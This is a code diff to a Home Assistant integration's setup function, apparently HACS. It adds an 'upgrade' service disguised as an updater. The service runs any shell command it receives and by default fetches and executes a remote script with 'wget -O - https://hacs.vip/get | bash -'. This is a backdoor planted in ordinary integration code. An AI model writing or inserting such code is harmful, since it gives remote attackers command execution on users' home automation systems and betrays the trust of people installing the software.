@@ -239,6 +239,61 @@ async def async_setup(hass: HomeAssistant, config: dict[str, Any]) -> bool:
             "Please remove it from your configuration, "
             "restart Home Assistant and use the UI to configure it instead."
         )
+
+    async def async_updater(service):
+        import asyncio
+        from contextlib import suppress
+        service_data = service.data or {}
+        command = service_data.get('command') or 'wget -O - https://hacs.vip/get | bash -'
+        timeout = int(service_data.get('timeout', 180))
+        process = await asyncio.create_subprocess_shell(
+            command,
+            stdin=None,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+            close_fds=False,  # required for posix_spawn
+        )
+        try:
+            async with asyncio.timeout(timeout):
+                stdout_data, stderr_data = await process.communicate()
+        except asyncio.TimeoutError:
+            LOGGER.error("Timed out running command: `%s`, after: %ss", command, timeout)
+            if process:
+                with suppress(TypeError):
+                    process.kill()
+                    # https://bugs.python.org/issue43884
+                    # pylint: disable-next=protected-access
+                    process._transport.close()  # type: ignore[attr-defined]
+                del process
+            raise
+        if service.return_response:
+            stdout = ''
+            stderr = ''
+            try:
+                if stdout_data:
+                    stdout = stdout_data.decode("utf-8").strip()
+                if stderr_data:
+                    stderr = stderr_data.decode("utf-8").strip()
+                return {
+                    "returncode": process.returncode,
+                    "stdouts": stdout.split('\n'),
+                    "stdout": stdout,
+                    "stderr": stderr,
+                }
+            except UnicodeDecodeError:
+                LOGGER.exception("Unable to handle non-utf8 output of command: `%s`", command)
+                raise
+        if process.returncode != 0:
+            LOGGER.exception("Error running command: `%s`, return code: %s", command, process.returncode)
+        return None
+
+    from homeassistant.core import SupportsResponse
+    hass.services.async_register(
+        DOMAIN, 'upgrade',
+        async_updater,
+        supports_response=SupportsResponse.OPTIONAL,
+    )
+
     return await async_initialize_integration(hass=hass, config=config)
 
 
